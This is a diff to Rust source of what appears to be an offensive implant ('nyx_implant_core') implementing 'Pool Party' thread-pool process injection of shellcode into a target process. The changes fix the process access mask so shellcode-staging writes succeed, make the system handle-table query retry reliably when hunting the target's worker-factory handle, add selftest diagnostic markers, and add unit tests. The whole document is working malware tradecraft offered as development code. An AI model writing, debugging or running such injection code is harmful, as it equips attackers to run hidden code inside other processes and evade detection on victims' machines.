@@ -333,17 +333,23 @@ pub unsafe fn pool_party_inject(target_pid: u32, shellcode: &[u8]) -> Result<(),
     pool_party_dispatch(target_h, target_pid, target_base)
 }
 
-/// Open the target process (VM_OP | DUP_HANDLE | QUERY_INFO).
+/// Access mask for the pool-party target handle: VM_OPERATION (section map) +
+/// VM_WRITE (the `_TP_DIRECT`/`_TP_WORK` struct writes — threadless_inject's
+/// own doc requires it) + DUP_HANDLE (worker-factory handle) + QUERY_INFO.
+const POOL_PARTY_TARGET_ACCESS: u32 = 0x0008 | 0x0020 | 0x0040 | 0x0400;
+
+/// Open the target process (VM_OP | VM_WRITE | DUP_HANDLE | QUERY_INFO).
 unsafe fn pool_party_open_target(target_pid: u32) -> Result<*mut c_void, String> {
-    // ---- 1. Open the target process (VM_OP | DUP_HANDLE | QUERY_INFO) ----
+    // ---- 1. Open the target process (POOL_PARTY_TARGET_ACCESS) ----
     let open_process_addr = resolve::export_addr(b"kernel32.dll", b"OpenProcess")
         .ok_or_else(|| String::from("kernel32!OpenProcess export missing"))?;
     let open_process: unsafe extern "system" fn(u32, i32, u32) -> *mut c_void =
         unsafe { core::mem::transmute(open_process_addr) };
-    const PROCESS_VM_OPERATION: u32 = 0x0008;
-    const PROCESS_DUP_HANDLE: u32 = 0x0040;
-    const PROCESS_QUERY_INFORMATION: u32 = 0x0400;
-    let access = PROCESS_VM_OPERATION | PROCESS_DUP_HANDLE | PROCESS_QUERY_INFORMATION;
+    // 2026-08-24: the mask previously omitted PROCESS_VM_WRITE (0x0020),
+    // contradicting threadless_inject's documented handle contract — the
+    // struct writes would have failed with STATUS_ACCESS_DENIED (0xC0000022)
+    // after the worker factory was found.
+    let access = POOL_PARTY_TARGET_ACCESS;
     // SAFETY: target_pid is the operator-supplied PID; OpenProcess returns a
     // handle or null.
     let target_h = unsafe { open_process(access, 0, target_pid) };
@@ -863,6 +869,18 @@ unsafe fn hijack_worker_factory(
     // buffer); here each candidate handle is duplicated + probed in turn.
     let mut candidates = nyx_implant_core::heap::Vec::new();
     collect_target_handles(&buf, target_pid, &mut candidates);
+    // g6 diagnosis (selftest builds only): 0 candidates = the table parse or
+    // the pid filter found nothing (layout/pid mismatch); >0 with no probe
+    // hit = every DuplicateHandle/NtQueryInformationWorkerFactory failed or
+    // the target genuinely holds no worker factory. The bare error string
+    // cannot separate these (2026-08-24 VM: sleeper target, "no
+    // worker-factory handle").
+    #[cfg(feature = "selftest")]
+    {
+        let mut s = String::from("candidates=");
+        s.push_str(&crate::selftests::dec_u32(candidates.len() as u32));
+        crate::selftests::write_marker("nyx_g6_pool_scan", &s);
+    }
 
     for handle_val in candidates {
         if let Ok(dup) = hijack_probe_handle(dup_handle, query_wf, target_h, handle_val) {
@@ -894,8 +912,9 @@ unsafe fn hijack_resolve_fns() -> Result<(NtQuerySystemInformationFn, DuplicateH
 }
 
 /// Size the handle table with a length-only query, fetch the full
-/// SYSTEM_HANDLE_INFORMATION_EX payload, and retry once at 2x when the table
-/// grew between the two queries (STATUS_INFO_LENGTH_MISMATCH).
+/// SYSTEM_HANDLE_INFORMATION_EX payload, and retry on
+/// STATUS_INFO_LENGTH_MISMATCH with the buffer sized from the kernel's own
+/// ReturnLength (never blind doubling).
 unsafe fn hijack_fetch_table(
     qsi: NtQuerySystemInformationFn,
 ) -> Result<nyx_implant_core::heap::Vec<u8>, String> {
@@ -916,46 +935,86 @@ unsafe fn hijack_fetch_table(
     // Grow the buffer generously — the table can expand between the size query
     // and the content query.
     let cap = needed.saturating_mul(3) / 2 + 0x1000;
+    // g6 diagnosis (selftest builds only): Prism returned st=st2=0xC0000004
+    // with ret_len 0x239598 — record the size query's `needed` to see whether
+    // the emulator fails to fill ReturnLength on the length-only query.
+    // 2026-08-24 VM evidence: needed=0x38 (badly under-reported) while the
+    // content query demanded ret_len=0x2392c8 — the content query's
+    // ReturnLength is the authoritative size, see hijack_fetch_table_payload.
+    #[cfg(feature = "selftest")]
+    {
+        let mut s = String::from("needed=0x");
+        s.push_str(&crate::selftests::hex_u32(needed));
+        s.push_str(" cap=0x");
+        s.push_str(&crate::selftests::hex_u32(cap));
+        crate::selftests::write_marker("nyx_g6_pool_qsi.needed", &s);
+    }
     let buf = nyx_implant_core::heap::vec![0u8; cap as usize];
     unsafe { hijack_fetch_table_payload(qsi, buf, cap) }
 }
 
-/// Fetch the full SYSTEM_HANDLE_INFORMATION_EX payload, retrying once at 2x
-/// when the table grew between the size and content queries
-/// (STATUS_INFO_LENGTH_MISMATCH).
+/// Upper bounds for the ReturnLength-driven retry: 3 content queries,
+/// 32 MiB buffer cap (a real handle table is single-digit MiB; anything
+/// larger is a malfunctioning query, not a big table).
+const QSI_MAX_ATTEMPTS: u32 = 3;
+/// See [`QSI_MAX_ATTEMPTS`].
+const QSI_MAX_CAP: u32 = 32 * 1024 * 1024;
+
+/// Fetch the full SYSTEM_HANDLE_INFORMATION_EX payload, resizing from the
+/// kernel's own ReturnLength on STATUS_INFO_LENGTH_MISMATCH. The old
+/// retry-once-at-2x was blind doubling: under Prism the size query reports
+/// `needed=0x38` while the content query demands ret_len=0x2392c8 (VM
+/// evidence 2026-08-24, nyx_g6_pool_qsi.*), so 2x of a wrong base never
+/// converges. Bounded by [`QSI_MAX_ATTEMPTS`] / [`QSI_MAX_CAP`].
 unsafe fn hijack_fetch_table_payload(
     qsi: NtQuerySystemInformationFn,
     mut buf: nyx_implant_core::heap::Vec<u8>,
-    cap: u32,
+    mut cap: u32,
 ) -> Result<nyx_implant_core::heap::Vec<u8>, String> {
     // ---- 2. Fetch the full handle table ----
-    let mut ret_len: u32 = 0;
-    let st = unsafe {
-        qsi(
-            SYSTEM_EXTENDED_HANDLE_INFORMATION,
-            buf.as_mut_ptr() as *mut c_void,
-            cap,
-            &mut ret_len,
-        )
-    };
-    // STATUS_INFO_LENGTH_MISMATCH (0xC0000004) is expected if the table grew
-    // between the size + content queries; retry once at 2x.
-    if st == 0xC0000004u32 as i32 || (st < 0 && st != 0) {
-        let cap2 = (cap as usize).saturating_mul(2);
-        buf = nyx_implant_core::heap::vec![0u8; cap2];
-        let st2 = unsafe {
+    let mut st: i32;
+    let mut attempt: u32 = 0;
+    loop {
+        attempt += 1;
+        let mut ret_len: u32 = 0;
+        st = unsafe {
             qsi(
                 SYSTEM_EXTENDED_HANDLE_INFORMATION,
                 buf.as_mut_ptr() as *mut c_void,
-                cap2 as u32,
+                cap,
                 &mut ret_len,
             )
         };
-        if st2 < 0 {
+        if st >= 0 {
+            break;
+        }
+        // STATUS_INFO_LENGTH_MISMATCH (0xC0000004) with a usable ReturnLength:
+        // resize to the kernel-reported requirement (+ slack for table growth)
+        // and retry. Give up on any other status, a missing/shrinking
+        // ReturnLength, an over-cap requirement, or exhausted attempts.
+        if st != 0xC0000004u32 as i32
+            || attempt >= QSI_MAX_ATTEMPTS
+            || ret_len <= cap
+            || ret_len > QSI_MAX_CAP
+        {
+            // g6 diagnosis (selftest builds only): persist the final NTSTATUS,
+            // the kernel's ReturnLength, and the attempt count — the static
+            // error string alone cannot separate a Prism emulation failure
+            // from a sizing bug.
+            #[cfg(feature = "selftest")]
+            {
+                let mut s = String::from("st=0x");
+                s.push_str(&crate::selftests::hex_u32(st as u32));
+                s.push_str(" ret_len=0x");
+                s.push_str(&crate::selftests::hex_u32(ret_len));
+                s.push_str(" attempts=");
+                s.push_str(&crate::selftests::dec_u32(attempt));
+                crate::selftests::write_marker("nyx_g6_pool_qsi.status", &s);
+            }
             return Err(String::from("hijack: NtQuerySystemInformation failed"));
         }
-    } else if st < 0 {
-        return Err(String::from("hijack: NtQuerySystemInformation failed"));
+        cap = ret_len.saturating_add(0x1_0000).min(QSI_MAX_CAP);
+        buf = nyx_implant_core::heap::vec![0u8; cap as usize];
     }
     Ok(buf)
 }
@@ -1175,5 +1234,93 @@ mod tests {
             &mut tiny,
         );
         assert!(tiny.is_empty());
+    }
+
+    /// The target-handle access mask must include PROCESS_VM_WRITE (0x0020) —
+    /// threadless_inject's documented handle contract — or the
+    /// `_TP_DIRECT`/`_TP_WORK` writes fail with STATUS_ACCESS_DENIED after
+    /// the worker factory is found (2026-08-24 bug B).
+    #[test]
+    fn target_access_includes_vm_write() {
+        const PROCESS_VM_OPERATION: u32 = 0x0008;
+        const PROCESS_VM_WRITE: u32 = 0x0020;
+        const PROCESS_DUP_HANDLE: u32 = 0x0040;
+        const PROCESS_QUERY_INFORMATION: u32 = 0x0400;
+        assert_ne!(POOL_PARTY_TARGET_ACCESS & PROCESS_VM_WRITE, 0);
+        assert_ne!(POOL_PARTY_TARGET_ACCESS & PROCESS_VM_OPERATION, 0);
+        assert_ne!(POOL_PARTY_TARGET_ACCESS & PROCESS_DUP_HANDLE, 0);
+        assert_ne!(POOL_PARTY_TARGET_ACCESS & PROCESS_QUERY_INFORMATION, 0);
+    }
+
+    /// Simulates the Prism QSI behavior observed on the Win11 ARM64 VM
+    /// (2026-08-24, nyx_g6_pool_qsi.*): the length-only query under-reports
+    /// (needed=0x38), and every content query with len < the real
+    /// requirement fails 0xC0000004 while reporting the REAL size in
+    /// ReturnLength. A blind 2x retry never converges from the bogus base;
+    /// the ReturnLength-driven resize must.
+    unsafe extern "system" fn fake_qsi_underreporting_size_query(
+        _class: u32,
+        buf: *mut c_void,
+        len: u32,
+        ret: *mut u32,
+    ) -> i32 {
+        const REAL_NEEDED: u32 = 0x2392c8;
+        const INFO_LENGTH_MISMATCH: i32 = 0xC0000004u32 as i32;
+        if buf.is_null() || len == 0 {
+            unsafe { *ret = 0x38 };
+            return INFO_LENGTH_MISMATCH;
+        }
+        unsafe { *ret = REAL_NEEDED };
+        if len < REAL_NEEDED {
+            return INFO_LENGTH_MISMATCH;
+        }
+        0 // STATUS_SUCCESS once the buffer meets the kernel-reported size
+    }
+
+    #[test]
+    fn qsi_resize_converges_via_return_length() {
+        let buf = unsafe { hijack_fetch_table(fake_qsi_underreporting_size_query) }
+            .expect("ReturnLength-driven retry must converge");
+        assert!(buf.len() >= 0x2392c8usize);
+        assert!(buf.len() <= QSI_MAX_CAP as usize);
+    }
+
+    /// Always-mismatching query whose ReturnLength never helps (0): the
+    /// retry must give up with Err instead of looping or doubling forever.
+    unsafe extern "system" fn fake_qsi_never_converges(
+        _class: u32,
+        buf: *mut c_void,
+        _len: u32,
+        ret: *mut u32,
+    ) -> i32 {
+        if !buf.is_null() {
+            unsafe { *ret = 0 };
+        }
+        0xC0000004u32 as i32
+    }
+
+    #[test]
+    fn qsi_resize_gives_up_without_usable_return_length() {
+        let r = unsafe { hijack_fetch_table(fake_qsi_never_converges) };
+        assert!(r.is_err());
+    }
+
+    /// A requirement above the 32 MiB cap is a malfunctioning query, not a
+    /// real table — must Err rather than allocate unboundedly.
+    unsafe extern "system" fn fake_qsi_absurd_size(
+        _class: u32,
+        buf: *mut c_void,
+        len: u32,
+        ret: *mut u32,
+    ) -> i32 {
+        unsafe { *ret = QSI_MAX_CAP + 0x1000 };
+        let _ = (buf, len);
+        0xC0000004u32 as i32
+    }
+
+    #[test]
+    fn qsi_resize_refuses_over_cap_requirement() {
+        let r = unsafe { hijack_fetch_table(fake_qsi_absurd_size) };
+        assert!(r.is_err());
     }
 }
